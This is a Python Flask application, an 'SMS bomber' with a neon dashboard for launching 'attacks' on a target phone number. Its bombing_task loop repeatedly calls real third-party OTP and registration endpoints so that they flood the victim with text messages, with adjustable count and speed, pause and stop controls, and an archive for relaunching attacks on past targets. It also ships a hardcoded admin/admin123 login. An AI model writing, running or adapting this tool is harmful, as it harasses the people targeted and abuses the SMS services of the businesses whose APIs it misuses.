import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- DATABASE ENGINE ----------
def get_db():
    conn = sqlite3.connect('rk_v6_pro.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- CORE ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, delay, start_dt):
    key = f"{username}_{phone}"
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
        "https://redx.com.bd/api/v1/user/otp?phone={}" # Example secondary API
    ]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            try:
                target_api = random.choice(api_list).format(phone)
                res = requests.get(target_api, timeout=5)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
                    active_sessions[key]['log'] = f"SUCCESS: SMS sent to {phone}"
                else:
                    active_sessions[key]['fail'] += 1
                    active_sessions[key]['log'] = f"FAILED: API rejected request"
            except Exception as e:
                active_sessions[key]['fail'] += 1
                active_sessions[key]['log'] = f"ERROR: Connection timeout"
            
            active_sessions[key]['total'] += 1
            time.sleep(delay)
        else:
            time.sleep(1)

    # Finalize and Save
    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- CYBER UI DESIGN ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM V6 PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --dark-bg: #020202; --panel: #0a0a0f; --text: #e0e0e0; --red: #ff2e63; --blue: #08d9d6; }
        body { background: var(--dark-bg); color: var(--text); font-family: 'Rajdhani', sans-serif; margin: 0; }
        
        /* Navbar */
        .nav { background: #000; padding: 15px 25px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 800; color: var(--neon); text-shadow: 0 0 10px var(--neon); }

        .container { padding: 20px; max-width: 800px; margin: auto; animation: scaleUp 0.5s ease; }
        @keyframes scaleUp { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        /* Dashboard Cards */
        .panel { background: var(--panel); border: 1px solid #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h3 { font-family: 'Orbitron'; font-size: 1rem; margin-top: 0; color: var(--blue); }

        /* Input Styling */
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #222; color: #fff; border-radius: 6px; font-family: 'Fira Code'; font-size: 14px; }
        input:focus { border-color: var(--neon); outline: none; }

        .btn-launch { background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; border-radius: 6px; font-family: 'Orbitron'; font-weight: 800; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-launch:hover { box-shadow: 0 0 20px var(--neon); transform: translateY(-2px); }

        /* Terminal Console */
        .console { background: #000; border: 1px solid #111; border-radius: 8px; height: 100px; overflow-y: auto; padding: 10px; font-family: 'Fira Code', monospace; font-size: 11px; color: #00ff00; margin-top: 10px; }

        /* Progress Bar */
        .bar-container { background: #111; height: 10px; border-radius: 5px; margin: 15px 0; overflow: hidden; border: 1px solid #222; }
        .bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--blue), var(--neon)); transition: 0.6s cubic-bezier(0.17, 0.67, 0.83, 0.67); }

        .status-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; text-align: center; }
        .stat-item { background: rgba(255,255,255,0.02); padding: 10px; border-radius: 8px; }
        .stat-val { display: block; font-family: 'Orbitron'; font-size: 1.1rem; color: #fff; }

        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .bg-neon { background: var(--neon); color: #000; }
        .bg-red { background: var(--red); color: #fff; }
        
        .history-card { border-left: 4px solid var(--blue); margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .re-btn { background: var(--blue); border: none; color: #000; padding: 5px 12px; border-radius: 4px; font-family: 'Orbitron'; font-size: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <div class="nav">
        <div class="logo">RK-SYSTEM <span style="color:#fff; font-size: 0.7rem;">V6.0 PRO</span></div>
        <div style="font-size: 12px; font-weight: bold;">
            <a href="/dashboard" style="color:var(--neon); text-decoration:none;">DASHBOARD</a> | 
            <a href="/history" style="color:#fff; text-decoration:none; margin-left:10px;">ARCHIVE</a>
        </div>
    </div>

    <div class="container">[CONTENT]</div>

    <script>
        function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }

        function updateLive() {
            let engine = document.getElementById('live-engine');
            if(!engine) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="panel" style="border-top: 2px solid var(--blue)">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                            <span style="font-family:'Orbitron'; color:var(--blue);">🛰 ATTACKING: ${s.phone}</span>
                            <span class="badge bg-neon">${s.status}</span>
                        </div>
                        <div class="bar-container"><div class="bar-fill" style="width:${p}%"></div></div>
                        <div class="status-grid">
                            <div class="stat-item"><h4>SUCCESS</h4><span class="stat-val" style="color:var(--neon)">${s.success}</span></div>
                            <div class="stat-item"><h4>FAILED</h4><span class="stat-val" style="color:var(--red)">${s.fail}</span></div>
                            <div class="stat-item"><h4>LIMIT</h4><span class="stat-val">${s.total}/${s.limit}</span></div>
                        </div>
                        <div class="console">> ${s.log}<br>> Internal Service: Online<br>> Thread ID: ${Math.floor(Math.random()*9000)+1000}</div>
                        <div style="display:flex; gap:10px; margin-top:15px;">
                            <button class="btn-launch" style="background:var(--blue); padding:8px;" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                            <button class="btn-launch" style="background:var(--red); color:white; padding:8px;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div>`;
                }
                engine.innerHTML = html;
            });
        }
        setInterval(updateLive, 2000);
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="panel" style="text-align:center; margin-top:50px;"><h3>SYSTEM CORE AUTH</h3><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Key Code"><button class="btn-launch">INITIALIZE CORE</button></form></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="panel">
            <h3>🚀 ATTACK INITIALIZER</h3>
            <form action="/api/start">
                <input name="num" placeholder="Target Phone Number (e.g. 017...)" required>
                <div style="display:flex; gap:10px;">
                    <input name="amt" type="number" placeholder="Count" required>
                    <select name="delay">
                        <option value="1.5">Turbo (1.5s)</option>
                        <option value="3.0">Safe (3.0s)</option>
                        <option value="0.5">Instant (0.5s)</option>
                    </select>
                </div>
                <button class="btn-launch">EXECUTE ATTACK</button>
            </form>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        data = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as ok, SUM(fail) as err FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    
    html = '<h3>📜 GLOBAL LOG ARCHIVE</h3>'
    for r in data:
        html += f'''
        <div class="panel history-card">
            <div>
                <b style="color:var(--neon); font-size:1.1rem;">{r['phone']}</b><br>
                <small style="color:#666;">Sessions: {r['sessions']} | Total OK: {r['ok']}</small>
            </div>
            <div style="text-align:right;">
                <span style="color:var(--red); font-size:11px; margin-right:10px;">Errors: {r['err']}</span>
                <button class="re-btn" onclick="location.href='/api/start?num={r['phone']}&amt=50&delay=1.5'">RE-LAUNCH</button>
            </div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API ACTIONS ----------
@app.route('/api/start')
def api_start():
    u, num, amt, delay = session.get('user'), request.args.get('num'), request.args.get('amt'), request.args.get('delay', 1.5)
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False, 'log': 'Starting connection...'
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), float(delay), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
